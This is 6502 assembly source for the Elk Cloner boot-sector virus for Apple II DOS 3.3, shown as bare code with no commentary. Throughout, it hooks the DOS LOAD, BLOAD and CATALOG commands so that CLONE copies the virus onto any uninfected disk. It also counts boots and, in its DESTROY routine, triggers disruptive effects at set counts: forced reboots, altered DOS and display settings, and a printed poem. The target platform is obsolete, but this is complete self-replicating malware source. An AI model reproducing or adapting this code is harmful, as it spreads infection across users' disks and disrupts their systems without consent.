	ORG $9000
VERSN	DFB $02 
HIMEM	LDA #$FF
	STA $4C
	LDA #$8F
	STA $4D
DOPTCH	LDA #$20 
	STA $A180  
	LDA #$5B 
	STA $A181 
	LDA #$A7 
	STA $A182 
RUNPTCH	LDA #$AD
	STA $A4D1
	LDA #$B6
	STA $A4D2
	LDA #$AA
	STA $A4D3
LODPTCH	LDA #$4C
	STA $A413 
	LDA #>LOD
	STA $A414 
	LDA #<LOD
	STA $A415 
BLDPTCH	LDA #$4C
	STA $A35D
	LDA #>BLOD
	STA $A35E
	LDA #<BLOD
	STA $A35F
CATPTCH	LDA #$4C
	STA $A56E
	LDA #>CATALOG 
	STA $A56F
	LDA #<CATALOG
	STA $A570
USRPTCH	LDA #$4C
	STA $0A
	LDA #>USRCMD 
	STA $0B
	LDA #<USRCMD 
	STA $0C
BOOTUP	CLD
	JSR READ 
	LDX $B3BF
	INX
	STX $B3BF
	JSR WRITE 
	JSR DESTROY
	JMP $A180 
TESTON	LDA #$00
	STA FLAG1
	LDA $AA68
	STA $B7EA
	JSR READ
	LDA $B3C2 
	CMP VERSN 
	BEQ TESTON1 
	LDA #$01
	STA FLAG1
TESTON1	RTS
LOD	JSR TESTON
	LDA FLAG1
	CMP #$00
	BEQ LOD1
	JSR CLONE
LOD1	JSR $A316
	JMP $A416
BLOD	JSR TESTON
	LDA FLAG1
	CMP #$00
	BEQ BLOD1
	JSR CLONE
BLOD1	JSR $A2A8
	JMP $A360
CATALOG	JSR TESTON
	LDA #$06
	JSR $A2AA
	LDA $B5BF
	STA $AA66
	LDA FLAG1
	CMP #$00
	BEQ RETURN
	JSR CLONE
RETURN	LDA #$0
	STA $B3BE
	STA $B3BF
	STA $B3C0
	RTS
CLONE	CLC
	JSR READ 
	LDA IDENT
	STA $B3C0
	LDA VERSN 
	STA $B3C2 
	JSR WRITE 
	LDA $AA68
	STA $B7EA
	LDA #$02
	STA $B7F4
	STA $B7EC
	LDA #$08
	STA $B7ED
	LDA #$0
	STA $B7EB
	STA $B7F0
	LDA #$95
	STA $B7F1
CLONE1	LDA #$B7
	LDY #$E8
	JSR $B7B5
	CLD
	BCC CLONE2
	RTS 
CLONE2	DEC $B7ED
	DEC $B7F1
	LDA $B7F1
	CMP #$8F
	BNE CLONE1
	LDA #$02
	STA $B7F1
	LDA #$01
	STA $B7F4
	STA $B7EC
	LDA #$0 
	STA $B7ED
	LDA #$B7
	LDY #$E8
	JSR $B7B5
	CLD
	BCC CLONE3
	RTS 
CLONE3	LDA #$4C
	STA $280 
	LDA #$00
	STA $281 
	LDA #$9B
	STA $282 
	LDA #$02
	STA $B7F4
	LDA #$B7
	LDY #$E8
	JSR $B7B5
	CLD
	BCC CLONE4
	RTS 
CLONE4	LDA #$0
	STA $B7EC
	LDA #$A
	STA $B7ED
	LDA #$95
	STA $B7F1
	LDA #$B7
	LDY #$E8
	JSR $B7B5
	CLD 
	RTS
READ	LDA #$01
	STA $B7F4
	JMP VTOC
WRITE	LDA #$02
	STA $B7F4
VTOC	LDA #$11
	STA $B7EC
	LDA #$0
	STA $B7ED
	LDA #$BB 
	STA $B7F0
	LDA #$B3
	STA $B7F1
	LDA #$0
	STA $B7EB
	LDA #$B7
	LDY #$E8
	JSR $B7B5
	CLD 
	RTS
PRINT	STY $FC
	STA $FD
	LDY #$00
PRINT0	LDA ($FC),Y 
	CMP #$00
	BEQ PRINT1
	JSR $FDED
	INY  
	JMP PRINT0
PRINT1	RTS
PRTMSG	LDY #>MSG
	LDA #<MSG
	JSR PRINT
PRTNUM	LDA IDENT
	STA $44
	JSR $AE42
	LDA #$8D
	JSR $FDED
	RTS
MSG	ASC 'ELK CLONER V2.0 # '
	DFB $0
IDENT	DFB $1
FLAG1	DFB $00
RET	RTS
USRCMD	JSR $E6FB
	CPX #$0B 
	BNE CMD2
	JSR PRTMSG
	RTS
CMD2	CPX #$0C 
	BNE CMD3
	LDY #>REPORT
	LDA #<REPORT
	JSR PRINT
	JSR READ 
	LDA $B3BF
	STA $44
	JSR $AE42
	LDA #$8D
	JSR $FDED
	RTS
CMD3	CPX #$0D 
	BNE CMD4
	JSR CLONE
	RTS
CMD4	CPX #$0A
	BNE USRERR
	JSR PRPOEM
	RTS
USRERR	LDY #>UERR
	LDA #<UERR
	JSR PRINT
	JSR $FBDD
	JMP $9DBF
UERR	DFB $8D 
	ASC 'ILLEGAL QUANTITY ERROR'
	DFB $0
PRPOEM	JSR $FC58
	LDY #>POEM
	LDA #<POEM
	JSR PRINT
	RTS
REPORT	ASC 'BOOT COUNT:15 ' 
	DFB $0 
POEM	ASC 'ELK CLONER:'
	DFB $8D,$8D 
	ASC '   THE PROGRAM WITH A PERSONALITY'
	DFB $8D,$8D,$8D 
	ASC 'IT WILL GET ON ALL YOUR DISKS'
	DFB $8D
	ASC 'IT WILL INFILTRATE YOUR CHIPS'
	DFB $8D
	ASC 'YES IT'
	DFB $A7
	ASC 'S CLONER!'
	DFB $8D,$8D
	ASC 'IT WILL STICK TO YOU LIKE GLUE'
	DFB $8D
	ASC 'IT WILL MODIFY RAM TOO'
	DFB $8D
	ASC 'SEND IN THE CLONER!'
	DFB $8D,$8D,$8D,$8D,$0 
IOERR	LDY #>ERRMSG
	LDA #<ERRMSG
	JSR PRINT
	JSR $FBDD 
	JMP $9DBF 
ERRMSG	DFB $8D,$8D 
	ASC 'I/O ERROR'
	DFB $8D,$00 
DESTROY	LDA $B3BF
	CMP #10 
	BNE DEST1
	LDA #$69 
	STA $3F2
	LDA #$FF 
	STA $3F3
	JSR $FB6F
	RTS
DEST1	CMP #15 
	BNE DEST2
	LDA #$3F
	STA $32
	RTS
DEST2	CMP #20 
	BNE DEST3
	LDA $C030
	LDA $C030
	LDA $C030
	RTS
DEST3	CMP #25 
	BNE DEST4
	LDA #$7F
	STA $32
	RTS
DEST4	CMP #30 
	BNE DEST5
	LDA #'I'
	STA $B3A7
	LDA #'T'
	STA $B3A8
	LDA #'B'
	STA $B3A9
	LDA #'A'
	STA $B3AA 
	RTS
DEST5	CMP #35 
	BNE DEST6
	LDA #$85
	STA $AAB2
	RTS
DEST6	CMP #40 
	BNE DEST7
	LDA #$00
	STA $3F2
	LDA #$03
	STA $3F3
	JSR $FB6F
	LDA #$4C
	STA $300
	LDA #$00
	STA $301
	LDA #$03
	STA $302
	RTS
DEST7	CMP #45 
	BNE DEST8
	LDA #$80
	STA $D6
	RTS
DEST8	CMP #50 
	BNE DEST9
	LDA #>PRPOEM
	STA $3F2
	LDA #<PRPOEM
	STA $3F3
	JSR $FB6F
	RTS
DEST9	CMP #55 
	BNE DEST10
	LDA #$FF
	STA $BDD3
	RTS
DEST10	CMP #60 
	BNE DEST11
	LDA #$20
	STA $BDD3
	RTS
DEST11	CMP #65 
	BNE DEST12
	LDA #$4C
	STA $A180
	LDA #$69
	STA $A181
	LDA #$FF
	STA $A182
	RTS
DEST12	CMP #70 
	BNE DEST13
	LDA #$10
	STA $BDD3
	RTS
DEST13	CMP #75 
	BNE DEST14
	JMP $C600
DEST14	CMP #76 
	BNE DEST15 
	JMP $C600
DEST15	CMP #77 
	BNE DEST16
	JMP $C600
DEST16	CMP #78 
	BNE DEST17
	JMP $C600
DEST17	CMP #79 
	BNE DEST18
	JSR READ 
	LDA #$00
	STA $B3BF
	JSR WRITE 
	RTS
DEST18	RTS
LOADER	ORG $9500
	LDA #$02 
	STA $B7EC 
	LDA #$01 
	STA $B7F4 
	LDA #$03
	STA $B7ED
	LDA #$0
	STA $B7EB
	STA $B7F0
	LDA #$90
	STA $B7F1
LOAD1	LDA #$B7
	LDY #$E8
	JSR $B7B5
	INC $B7ED
	INC $B7F1
	LDA $B7F1
	CMP #$96
	BCC LOAD1
	JMP HIMEM 

